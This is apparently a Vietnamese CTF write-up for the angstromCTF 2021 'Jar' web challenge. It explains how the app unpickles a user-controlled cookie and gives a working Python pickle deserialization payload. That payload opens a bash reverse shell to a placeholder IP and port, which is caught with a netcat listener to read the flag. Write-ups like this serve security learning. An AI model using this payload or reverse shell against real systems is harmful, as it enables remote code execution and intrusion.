Jar
===
**Category:** Web

**Author:** kmh

**Point:** 
### Desscription
- My other pickle challenges seem to be giving you all a hard time, so here's a simpler one to get you warmed up.
- Site: `https://jar.2021.chall.actf.co/`
- Source: `jar.zip`

### Overview
Site cho chúng ta input vào `item` và sau khi add item thì nó sẽ hiện thị ra site và kiểm tra cookie thì thấy nó cũng được set cho cookie.
Chúng ta được author cung cấp cho một file source là `jar.py` mở ra để phân tích thì thấy flag ở biến environment (FLAG). Có 3 route đó là `/pickle.jpg` hiện thị ra hình ảnh `pickle.jpg`, `/` là trang chủ có function jar() và trong function này có một chỗ chúng ta có thể control được đó là cookie `contents`, chúng ta có thể thay đổi nó thành giá trị bất kì và chương trình sử dụng pickle.loads() để gán cho `items`. Cuối cùng sẽ return về form html kèm theo item ở vị trí radom
`/add` ở route này thì chúng ta vẫn tiếp tục có thể control được cookie `contents` và có thêm là `items` sẽ được append từ `form['item']` là cái mình input ở ngoài site. Sau đó sẽ set cookie `contents` bằng pickle.dumps(items). items chính là một array còn item là từng phần tử trong array đó.

### Solution
Về vấn đề pickle thì đã được document của python đề cập đến việc sử dụng pickle một cách không cẩn thận thì có dễ dẫn đến việc RCE. Ở đây việc set có cookie `contents` sử dụng pickle.loads và pickle.dump nên chúng ta có thể tấn công theo kiểu `pickle deserialization`.
Vì vậy ở đây chúng ta tạo một class sử dụng `__reduce__` để RCE nó. Khi mà có pickled thì method `__reduce__` sẽ được gọi.

##### Payload
```py
import requests,pickle,builtins,os,base64

url = 'https://jar.2021.chall.actf.co/add'

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',))

print(base64.b64encode(pickle.dumps(SerializedPickle())))
```
Bên server của mình nhập `nc -lvp PORT` để listen
Sau khi tạo ra chuỗi base64 thì mình sẽ thay vô cookie contents và f5. Sau đó bên server chỉ cần `echo $FLAG` vì flag ở biến environment như trong code đã đề cập tới